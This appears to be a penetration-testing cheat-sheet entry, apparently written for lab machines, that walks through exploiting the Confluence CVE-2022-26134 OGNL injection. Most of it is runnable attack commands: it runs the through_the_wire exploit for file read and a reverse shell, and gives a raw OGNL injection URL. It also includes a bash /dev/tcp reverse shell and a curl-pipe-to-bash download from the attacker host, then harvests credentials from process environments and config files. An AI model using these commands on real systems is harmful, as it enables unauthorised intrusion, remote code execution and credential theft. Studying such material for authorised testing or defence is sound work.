title: Atlassian Confluence — CVE-2022-26134 Unauthenticated RCE (OGNL Injection)
body:
Confluence Server and Data Center < 7.18.1 (and several earlier LTS versions) have an unauthenticated OGNL injection vulnerability in the HTTP request path. No credentials needed — a single HTTP request gives you RCE as the confluence service user. Ports 8090 (Confluence) and 8091 (Synchrony) are the fingerprint. The through_the_wire exploit handles file read, file write, and reverse shell in one tool.

After foothold: you land as the confluence service user. The most important post-shell steps are (1) check process environment variables for database passwords — app passwords frequently reuse the OS root password, and (2) check /opt/ for custom scripts owned by your user that root's cron might be executing.
cmd:
# ══════════════════════════════════════════════════
# IDENTIFY
# ══════════════════════════════════════════════════
# Ports: 8090 (Confluence HTTP), 8091 (Synchrony)
# nmap fingerprint:
# 8090/tcp open http Apache Tomcat (language: en)
# http-title: Log In - Confluence
# Version in page source or /login.action footer
curl -s http://$ip:8090/login.action | grep -i 'version\|confluence'

# Vulnerable versions: < 7.18.1, < 7.17.5, < 7.16.4, < 7.15.2, < 7.14.3
# < 7.13.8 (LTS), < 7.4.17 (LTS)
# If version is in any of these ranges: exploit

# ══════════════════════════════════════════════════
# EXPLOIT — through_the_wire (recommended)
# ══════════════════════════════════════════════════
git clone https://github.com/jbaines-r7/through_the_wire exploits/through_the_wire
cd exploits/through_the_wire

# Confirm vulnerable — read /etc/passwd:
python3 through_the_wire.py --rhost $ip --rport 8090 --lhost $lhost --protocol http:// --read-file /etc/passwd
# If you get passwd output = vulnerable and RCE confirmed

# Get reverse shell:
python3 through_the_wire.py --rhost $ip --rport 8090 --lhost $lhost --protocol http:// --reverse-shell
# Catches shell on port 1270 (default)
# Shell lands as: confluence@target

# HTTPS target:
python3 through_the_wire.py --rhost $ip --rport 8443 --lhost $lhost --protocol https:// --reverse-shell

# ══════════════════════════════════════════════════
# UPGRADE SHELL
# ══════════════════════════════════════════════════
# Shell from through_the_wire is limited — upgrade immediately:
# Host shell.sh on Kali:
# cat > shell.sh << EOF
# #!/bin/bash
# bash -i >& /dev/tcp/$lhost/6666 0>&1
# EOF
# python3 -m http.server 8001
# nc -nlvp 6666

# In the confluence shell:
curl http://$lhost:8001/shell.sh | bash

# Upgrade:
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# ══════════════════════════════════════════════════
# POST-SHELL — HIGH PRIORITY CHECKS
# ══════════════════════════════════════════════════
# 1. Database password in environment (try su root with it):
cat /proc/$(pgrep -f confluence | head -1)/environ 2>/dev/null | tr '\0' '\n' | grep -i 'password\|passwd\|secret'
# Look for: synchrony.database.password=<value>
# Try immediately: su root → <that password>
# App DB passwords reuse OS root password constantly on lab boxes

# 2. Custom scripts you own in /opt:
ls -la /opt/
find /opt -user confluence -type f 2>/dev/null
# Owned by you + writes to /root/ or /etc/ = root cron (see cron_check node)

# 3. Confluence config for more creds:
cat /var/atlassian/application-data/confluence/confluence.cfg.xml 2>/dev/null | grep -i 'password\|url\|username'
cat /opt/atlassian/confluence/conf/server.xml 2>/dev/null

# 4. Local.txt:
cat /home/confluence/local.txt

# ══════════════════════════════════════════════════
# ALTERNATIVE EXPLOIT (manual curl)
# ══════════════════════════════════════════════════
# If through_the_wire fails, raw OGNL injection:
curl -v http://$ip:8090/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%7D/
# Or use searchsploit:
searchsploit confluence 2022
searchsploit -m 51068   # or similar EDB ID

# ══════════════════════════════════════════════════
# TROUBLESHOOTING
# ══════════════════════════════════════════════════
# SyntaxWarning on through_the_wire.py:
#   → Harmless — Python 3.12+ warns on unescaped backslashes in strings
#   → Does not affect exploit functionality, ignore it

# Shell connects but dies immediately:
#   → confluence user has /bin/sh not /bin/bash
#   → Use curl shell.sh | bash upgrade method

# Connection refused on port 8090:
#   → Try 8443 (HTTPS) with --protocol https://
#   → Check if Confluence is on a different port: nmap -p- $ip
warn: SyntaxWarning messages from through_the_wire.py are harmless — Python 3.12+ flags unescaped backslashes in the ASCII art banner, the exploit itself runs fine. Always check process environment variables immediately after getting a shell — grep for 'password' in /proc/PID/environ. The database password is frequently the root password on lab boxes. Also check /opt/ for scripts owned by your user that root's cron might execute.
